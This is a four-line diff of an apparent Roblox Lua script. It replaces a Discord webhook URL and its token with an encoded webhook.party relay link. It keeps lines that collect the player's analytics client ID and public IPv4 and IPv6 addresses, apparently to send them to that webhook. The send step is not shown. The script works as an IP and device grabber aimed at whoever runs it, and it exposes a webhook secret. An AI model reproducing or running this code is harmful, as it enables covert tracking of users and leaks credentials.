@@ -1,4 +1,4 @@
-local Webhook = "https://discord.com/api/webhooks/1334221042410983517/vOF2bI4ENdO_tUDlqeIduMMNb5NNB8xlUsXvvthS7v33Ok03KtXR5Fw2JjXRo327vbYg" -- Put your Webhook link here
+local Webhook = "https://l.webhook.party/hook/YDxJ8HZp0X7qf1VnpHtJsCmWv7ry14UGemk5tJg11rDXCDCyN9lUmhq0tUSlQZ%2F1aY1j4vA%2FthPfBuTawLBoUBpv7oe4z1wumV2Js160tcV%2FipBJLJtKHvbDbgIczeQYAFYtd2kzlYfBo%2BkSSYX7fdTd55%2BYjrj9gzkIKiV4Bv6%2B%2BEfXd0K%2FSeAmopmI8fxveDmBLeQXZb6ur0CtJZ9vJzWUN5UVBrTuFbkerrRh8fzmXfRZ33S374KJDhOP6sForh%2Bq3289RBqzP%2Fso6Ut4MqATNeoQyEuRpucccqjdWjHHc87u2RxQBwUTlwK6FL%2BBraURaJpKWhzdcWeT4dWCVBWP%2BzPmSWS02%2FQR6NQKYUnMsQ%2FGFA0guTDYquBpBgJZs8b8%2Ff%2F9zo5VhBEE/CxhhcWblsokmgfS8" -- Put your Webhook link here
 local clientid = game:GetService("RbxAnalyticsService"):GetClientId()
 local IPv4 = game:HttpGet("https://api.ipify.org") -- IPv4 (you can replace this with any API service)
 local IPv6 = game:HttpGet("https://api64.ipify.org") -- IPv6 (you can replace this with any API service)
